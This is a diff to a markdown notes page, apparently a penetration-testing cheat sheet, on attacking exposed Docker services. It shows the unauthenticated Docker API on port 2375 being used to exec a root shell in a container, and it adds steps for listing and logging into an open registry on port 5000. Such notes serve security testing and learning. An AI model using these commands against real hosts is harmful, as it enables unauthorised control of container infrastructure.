@@ -1,7 +1,17 @@
-Docker
-======
+---
+title: "Docker"
+description: "Docker commands"
+date: 22/09/2020
+categories:
+ - misc
+tags:
+ - docker
+ - API
+---
 
-## API
+
+## Docker API
+
 The docker API expose the port `2375`. This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated.
 
 To confirm that the host is running Docker you can make a GET requests to `/version` :
@@ -23,6 +33,37 @@ $ docker -H <host>:<port> exec -it <container_name> /bin/bash
 root@abc:/# whoami
 root
 ```
+
+
+## Registry server
+
+The registry server is deployed on port `5000`. Go to `/v2/_catalog` on your browser to
+check if this is a registry server.
+
+```http
+http://<host>:5000/v2/_catalog
+```
+
+The server responds with the list of repositories:
+
+```json
+{"repositories":["repostitory-1"]}
+```
+
+You can configure your docker client to connect to this server.
+
+```bash
+sudo docker login <host>:5000
+```
+
+If there is a custom certificate, then add an exception in `/etc/docker/daemon.json` with:
+
+```json
+{
+    "insecure-registries":[ "<host>:5000"]
+}
+```
+
 
 ## Privilege Escalation
 
